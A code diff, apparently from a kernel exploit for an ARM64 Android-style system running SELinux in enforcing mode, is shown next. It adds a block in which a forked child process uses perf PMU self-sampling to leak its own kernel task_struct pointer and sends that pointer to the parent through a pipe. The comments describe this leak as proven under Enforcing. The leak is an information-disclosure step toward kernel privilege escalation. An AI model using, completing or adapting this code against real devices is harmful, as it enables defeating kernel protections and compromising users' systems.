@@ -1754,9 +1754,27 @@ static void child_main(struct child_pipes *p) {
     CPU_SET(6, &set);
     sched_setaffinity(0, sizeof(set), &set);
   }
-  /* Ready token only — parent HW-samples our getpid loop (Z19 self-sample
-   * was timer-IRQ rb nodes, not task_struct). */
+  /*
+   * CHILD SELF-LEAK (JoinChang architecture, 09-12): the child runs the
+   * PROVEN user-PMU self-leak (pid=0, pmu8_user_xk works under
+   * Enforcing) on ITSELF and sends the real task pointer through the
+   * pipe. Parent-side perf-open(child) failed 0/0 on the last boots;
+   * self-leak inside the child is the proven-stable variant. Parent
+   * still HW-samples as fallback cross-check.
+   */
   uintptr_t my_task = 0;
+  {
+    struct perf_leak ml;
+    memset(&ml, 0, sizeof(ml));
+    perf_collect(0, &ml); /* pid 0 = this process (the child) */
+    if (task_ptr_ok(ml.x28) && ml.x28_cnt >= 4) {
+      my_task = ml.x28;
+      pr_info("child self-leak task=%016zx/%d\n", my_task, ml.x28_cnt);
+    } else {
+      pr_info("child self-leak FAILED (cnt=%d) — token stays 0\n",
+              ml.x28_cnt);
+    }
+  }
   write(p->task_w, &my_task, sizeof(my_task));
   close(p->task_w);
   char cmd = 0;
